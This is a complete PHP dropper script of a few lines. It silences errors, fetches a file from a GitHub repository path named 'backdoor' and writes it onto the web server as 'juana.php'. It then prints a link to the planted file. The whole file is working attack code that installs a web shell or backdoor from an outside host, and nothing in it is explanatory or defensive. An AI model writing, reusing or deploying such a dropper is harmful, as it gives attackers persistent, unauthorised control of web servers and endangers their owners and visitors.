<?php
error_reporting(0);
$shell = fopen("juana.php", "w");
$file_shell = file_get_contents("https://raw.githubusercontent.com/kakaroot1337/backdoor/main/juan1.php");
fwrite($shell, $file_shell);
fclose($shell);
echo "<a href='juana.php'>Here Boyz</a>";
?>
